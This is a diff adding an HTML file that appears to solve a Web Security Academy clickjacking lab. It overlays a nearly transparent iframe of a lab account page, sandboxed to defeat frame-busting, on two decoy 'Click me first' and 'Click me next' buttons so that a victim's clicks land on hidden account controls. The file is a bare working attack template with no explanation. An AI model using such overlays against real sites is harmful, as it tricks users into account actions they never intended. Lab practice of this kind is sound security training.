@@ -1,0 +1,22 @@
+<style>
+	iframe {
+		position:relative;
+		width:500px;
+		height: 700px;
+		opacity: 0.1;
+		z-index: 2;
+	}
+   .firstClick, .secondClick {
+		position:absolute;
+		top:510px;
+		left:50px;
+		z-index: 1;
+	}
+   .secondClick {
+		top:285px;
+		left:225px;
+	}
+</style>
+<div class="firstClick">Click me first</div>
+<div class="secondClick">Click me next</div>
+<iframe sandbox="allow-forms" src="https://0afd00bb043e5cc2c0d1f87200ab00ff.web-security-academy.net/my-account/"></iframe>
